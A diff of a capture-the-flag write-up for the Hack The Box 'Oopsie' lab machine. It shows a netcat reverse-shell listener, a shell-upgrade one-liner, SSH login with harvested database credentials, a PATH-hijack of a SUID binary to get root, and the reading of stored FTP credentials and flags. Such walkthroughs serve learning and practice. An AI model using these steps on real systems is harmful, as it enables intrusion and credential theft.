@@ -138,7 +138,8 @@ Here I found `uploads` directory thus by changing the url to `10.10.10.28/upload
 </p>
 
 Here it kept buffering but `nc` connection gets extablished simultaneously.
-- [`nc -lvmp port`]
+- [`nc -lvmp port`](nc.txt) ## nc -lvmp 10500
+    - ```python3 -c 'import pty; pty.spawn("/bin/bash")'``` (Bonus for getting interactive terminal like access)
 ```
 Connection from 10.10.10.28:53738
 Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
@@ -186,16 +187,244 @@ $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
 ?>
 www-data@oopsie:/var/www/html/cdn-cgi/login$ 
 ```
-python3 -c 'import pty; pty.spawn("/bin/bash")'
+- Using the `Username - robert` & `Password - M3g4C0rpUs3r!` for [SSH](ssh2.txt) we get
 
-Robert
-f2c74ee8db7983851ab2a96a44eb7981
+```
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Aug 16 19:44:40 UTC 2021
+
+  System load:  0.69               Processes:             114
+  Usage of /:   25.5% of 19.56GB   Users logged in:       0
+  Memory usage: 16%                IP address for ens160: 10.10.10.28
+  Swap usage:   0%
 
 
-<?php
-$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
-?>
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+0 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
 
-SYSTEM
-af13b0bee69f8a877c3faf667f7beacf
+Last login: Mon Aug 16 19:39:59 2021 from 10.10.16.58
+
+robert@oopsie:~$ ls 
+user.txt
+robert@oopsie:~$ cd ..
+robert@oopsie:/home$ cd ..
+robert@oopsie:/$ ls -al
+total 2097256
+drwxr-xr-x  24 root root       4096 Jan 27  2020 .
+drwxr-xr-x  24 root root       4096 Jan 27  2020 ..
+drwxr-xr-x   2 root root       4096 Jan 27  2020 bin
+drwxr-xr-x   3 root root       4096 Jan 27  2020 boot
+drwxr-xr-x   2 root root       4096 Jan 23  2020 cdrom
+drwxr-xr-x  18 root root       3920 Aug 16 19:44 dev
+drwxr-xr-x  98 root root       4096 Jan 28  2020 etc
+drwxr-xr-x   3 root root       4096 Jan 23  2020 home
+lrwxrwxrwx   1 root root         33 Jan 27  2020 initrd.img -> boot/initrd.img-4.15.0-76-generic
+lrwxrwxrwx   1 root root         33 Jan 23  2020 initrd.img.old -> boot/initrd.img-4.15.0-74-generic
+drwxr-xr-x  23 root root       4096 Jan 27  2020 lib
+drwxr-xr-x   2 root root       4096 Aug  5  2019 lib64
+drwx------   2 root root      16384 Jan 23  2020 lost+found
+drwxr-xr-x   2 root root       4096 Aug  5  2019 media
+drwxr-xr-x   2 root root       4096 Aug  5  2019 mnt
+drwxr-xr-x   2 root root       4096 Aug  5  2019 opt
+dr-xr-xr-x 126 root root          0 Aug 16 19:44 proc
+drwx------   8 root root       4096 Mar 20  2020 root
+drwxr-xr-x  27 root root        880 Aug 16 19:44 run
+drwxr-xr-x   2 root root      12288 Jan 27  2020 sbin
+drwxr-xr-x   4 root root       4096 Jan 23  2020 snap
+drwxr-xr-x   2 root root       4096 Aug  5  2019 srv
+-rw-------   1 root root 2147483648 Jan 23  2020 swap.img
+dr-xr-xr-x  13 root root          0 Aug 16 19:44 sys
+drwxrwxrwt  11 root root       4096 Aug 16 19:44 tmp
+drwxr-xr-x  10 root root       4096 Aug  5  2019 usr
+drwxr-xr-x  14 root root       4096 Jan 23  2020 var
+lrwxrwxrwx   1 root root         30 Jan 27  2020 vmlinuz -> boot/vmlinuz-4.15.0-76-generic
+lrwxrwxrwx   1 root root         30 Jan 23  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-74-generic
+robert@oopsie:/$ cd /tmp/
+robert@oopsie:/tmp$ ls -al
+total 44
+drwxrwxrwt 11 root root 4096 Aug 16 19:45 .
+drwxr-xr-x 24 root root 4096 Jan 27  2020 ..
+drwxrwxrwt  2 root root 4096 Aug 16 19:44 .font-unix
+drwxrwxrwt  2 root root 4096 Aug 16 19:44 .ICE-unix
+drwx------  3 root root 4096 Aug 16 19:44 systemd-private-81c7b18ad4004d6aadcf89d235d5d793-apache2.service-GDtgP1
+drwx------  3 root root 4096 Aug 16 19:44 systemd-private-81c7b18ad4004d6aadcf89d235d5d793-systemd-resolved.service-YriYv1
+drwx------  3 root root 4096 Aug 16 19:44 systemd-private-81c7b18ad4004d6aadcf89d235d5d793-systemd-timesyncd.service-q7HLjf
+drwxrwxrwt  2 root root 4096 Aug 16 19:44 .Test-unix
+drwx------  2 root root 4096 Aug 16 19:44 vmware-root_546-2999591749
+drwxrwxrwt  2 root root 4096 Aug 16 19:44 .X11-unix
+drwxrwxrwt  2 root root 4096 Aug 16 19:44 .XIM-unix
+robert@oopsie:/tmp$ echo PATH=/tmp:$PATH
+PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+robert@oopsie:/tmp$ echo '/bin/sh' > cat
+robert@oopsie:/tmp$ chmod +x cat
+robert@oopsie:/tmp$ ls -al
+total 48
+drwxrwxrwt 11 root   root   4096 Aug 16 19:45 .
+drwxr-xr-x 24 root   root   4096 Jan 27  2020 ..
+-rwxrwxr-x  1 robert robert    8 Aug 16 19:45 cat
+drwxrwxrwt  2 root   root   4096 Aug 16 19:44 .font-unix
+drwxrwxrwt  2 root   root   4096 Aug 16 19:44 .ICE-unix
+drwx------  3 root   root   4096 Aug 16 19:44 systemd-private-81c7b18ad4004d6aadcf89d235d5d793-apache2.service-GDtgP1
+drwx------  3 root   root   4096 Aug 16 19:44 systemd-private-81c7b18ad4004d6aadcf89d235d5d793-systemd-resolved.service-YriYv1
+drwx------  3 root   root   4096 Aug 16 19:44 systemd-private-81c7b18ad4004d6aadcf89d235d5d793-systemd-timesyncd.service-q7HLjf
+drwxrwxrwt  2 root   root   4096 Aug 16 19:44 .Test-unix
+drwx------  2 root   root   4096 Aug 16 19:44 vmware-root_546-2999591749
+drwxrwxrwt  2 root   root   4096 Aug 16 19:44 .X11-unix
+drwxrwxrwt  2 root   root   4096 Aug 16 19:44 .XIM-unix
+robert@oopsie:/tmp$ /usr/bin/bugtracker 
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 1
+---------------
+
+Binary package hint: ev-engine-lib
+
+Version: 3.3.3-1
+
+Reproduce:
+When loading library in firmware it seems to be crashed
+
+What you expected to happen:
+Synchronized browsing to be enabled since it is enabled for that site.
+
+What happened instead:
+Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
+
+robert@oopsie:$ export PATH=/tmp:$PATH
+robert@oopsie:$ cd tmp
+robert@oopsie:/tmp$ echo '/bin/sh' > cat
+robert@oopsie:/tmp$ chmod +x cat
+
+robert@oopsie:/tmp$ /usr/bin/bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 13
+---------------
+
+# id
+uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+# ls -al
+total 48
+drwxrwxrwt 11 root   root   4096 Aug 16 19:45 .
+drwxr-xr-x 24 root   root   4096 Jan 27  2020 ..
+-rwxrwxr-x  1 robert robert    8 Aug 16 19:48 cat
+drwxrwxrwt  2 root   root   4096 Aug 16 19:44 .font-unix
+drwxrwxrwt  2 root   root   4096 Aug 16 19:44 .ICE-unix
+drwx------  3 root   root   4096 Aug 16 19:44 systemd-private-81c7b18ad4004d6aadcf89d235d5d793-apache2.service-GDtgP1
+drwx------  3 root   root   4096 Aug 16 19:44 systemd-private-81c7b18ad4004d6aadcf89d235d5d793-systemd-resolved.service-YriYv1
+drwx------  3 root   root   4096 Aug 16 19:44 systemd-private-81c7b18ad4004d6aadcf89d235d5d793-systemd-timesyncd.service-q7HLjf
+drwxrwxrwt  2 root   root   4096 Aug 16 19:44 .Test-unix
+drwx------  2 root   root   4096 Aug 16 19:44 vmware-root_546-2999591749
+drwxrwxrwt  2 root   root   4096 Aug 16 19:44 .X11-unix
+drwxrwxrwt  2 root   root   4096 Aug 16 19:44 .XIM-unix
+# cd ..
+# ls -al
+total 2097256
+drwxr-xr-x  24 root root       4096 Jan 27  2020 .
+drwxr-xr-x  24 root root       4096 Jan 27  2020 ..
+drwxr-xr-x   2 root root       4096 Jan 27  2020 bin
+drwxr-xr-x   3 root root       4096 Jan 27  2020 boot
+drwxr-xr-x   2 root root       4096 Jan 23  2020 cdrom
+drwxr-xr-x  18 root root       3920 Aug 16 19:44 dev
+drwxr-xr-x  98 root root       4096 Jan 28  2020 etc
+drwxr-xr-x   3 root root       4096 Jan 23  2020 home
+lrwxrwxrwx   1 root root         33 Jan 27  2020 initrd.img -> boot/initrd.img-4.15.0-76-generic
+lrwxrwxrwx   1 root root         33 Jan 23  2020 initrd.img.old -> boot/initrd.img-4.15.0-74-generic
+drwxr-xr-x  23 root root       4096 Jan 27  2020 lib
+drwxr-xr-x   2 root root       4096 Aug  5  2019 lib64
+drwx------   2 root root      16384 Jan 23  2020 lost+found
+drwxr-xr-x   2 root root       4096 Aug  5  2019 media
+drwxr-xr-x   2 root root       4096 Aug  5  2019 mnt
+drwxr-xr-x   2 root root       4096 Aug  5  2019 opt
+dr-xr-xr-x 137 root root          0 Aug 16 19:44 proc
+drwx------   8 root root       4096 Mar 20  2020 root
+drwxr-xr-x  27 root root        880 Aug 16 19:44 run
+drwxr-xr-x   2 root root      12288 Jan 27  2020 sbin
+drwxr-xr-x   4 root root       4096 Jan 23  2020 snap
+drwxr-xr-x   2 root root       4096 Aug  5  2019 srv
+-rw-------   1 root root 2147483648 Jan 23  2020 swap.img
+dr-xr-xr-x  13 root root          0 Aug 16 19:44 sys
+drwxrwxrwt  11 root root       4096 Aug 16 19:45 tmp
+drwxr-xr-x  10 root root       4096 Aug  5  2019 usr
+drwxr-xr-x  14 root root       4096 Jan 23  2020 var
+lrwxrwxrwx   1 root root         30 Jan 27  2020 vmlinuz -> boot/vmlinuz-4.15.0-76-generic
+lrwxrwxrwx   1 root root         30 Jan 23  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-74-generic
+# cd root
+# ls -al
+total 48
+drwx------  8 root root 4096 Mar 20  2020 .
+drwxr-xr-x 24 root root 4096 Jan 27  2020 ..
+lrwxrwxrwx  1 root root    9 Jan 25  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Jan 24  2020 .cache
+drwxr-xr-x  3 root root 4096 Jan 25  2020 .config
+drwx------  3 root root 4096 Jan 24  2020 .gnupg
+drwxr-xr-x  3 root root 4096 Jan 23  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwxr-xr-x  2 root root 4096 Jan 24  2020 reports
+-rw-r--r--  1 root root   33 Feb 25  2020 root.txt
+drwx------  2 root root 4096 Jan 23  2020 .ssh
+-rw-------  1 root root 1325 Mar 20  2020 .viminfo
+# cd .config	
+# ls -al
+total 12
+drwxr-xr-x 3 root root 4096 Jan 25  2020 .
+drwx------ 8 root root 4096 Mar 20  2020 ..
+drwxr-xr-x 2 root root 4096 Sep 11  2020 filezilla
+# cd filezilla
+# ls -al
+total 12
+drwxr-xr-x 2 root root 4096 Sep 11  2020 .
+drwxr-xr-x 3 root root 4096 Jan 25  2020 ..
+-rw-r--r-- 1 root root  646 Sep 11  2020 filezilla.xml
+# more filezilla.xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<FileZilla3>
+    <RecentServers>
+        <Server>
+            <Host>10.10.10.46</Host>
+            <Port>21</Port>
+            <Protocol>0</Protocol>
+            <Type>0</Type>
+            <User>ftpuser</User>
+            <Pass>mc@F1l3ZilL4</Pass>
+            <Logontype>1</Logontype>
+            <TimezoneOffset>0</TimezoneOffset>
+            <PasvMode>MODE_DEFAULT</PasvMode>
+            <MaximumMultipleConnections>0</MaximumMultipleConnections>
+            <EncodingType>Auto</EncodingType>
+            <BypassProxy>0</BypassProxy>
+        </Server>
+    </RecentServers>
+</FileZilla3>
+# reboot
+Connection to 10.10.10.28 closed by remote host.
+Connection to 10.10.10.28 closed.
+```
+- Get the entire ssh [here](ssh.txt)
+- This from here we get the details of `
+USER FLAG - f2c74ee8db7983851ab2a96a44eb7981 &&
+SYSTEM FLAG -  af13b0bee69f8a877c3faf667f7beacf`
+
+
+
+- Additional information 
+`Username - ftpuser Password - mc@F1l3ZilL4`
